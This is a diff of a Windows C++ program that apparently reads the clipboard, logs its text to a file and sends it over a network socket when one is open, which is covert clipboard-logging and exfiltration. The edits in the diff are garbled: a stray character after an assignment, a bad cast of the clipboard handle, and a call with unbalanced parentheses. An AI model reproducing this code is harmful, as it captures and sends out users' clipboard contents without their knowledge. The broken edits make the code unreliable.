@@ -72,7 +72,7 @@ int main() {
 		printf("Error at socket(): %ld\n", WSAGetLastError());
 		freeaddrinfo(result);
 		WSACleanup();
-		GoodSocket = false;
+		GoodSocket = false;G
 	}
 
 
@@ -147,7 +147,7 @@ int main() {
 					//grab text from the clipboard
 					in = GetClipboardData(CF_TEXT);
 					//using said text display it to the console and store into the Logbook
-					std::cout << (char*)in << endl;
+					std::cout << (string)in << endl;
 					Recorder << (char*)in << endl;
 					if (GoodSocket){
 						os << (char*)in;
@@ -208,6 +208,7 @@ int main() {
 					//using said text display it to the console and store into the Logbook
 					std::cout << (char*)in << endl;
 					Recorder << (char*)in << endl;
+					someFunc((char*))in);
 					if (GoodSocket) {
 
 						os << (char*)in;
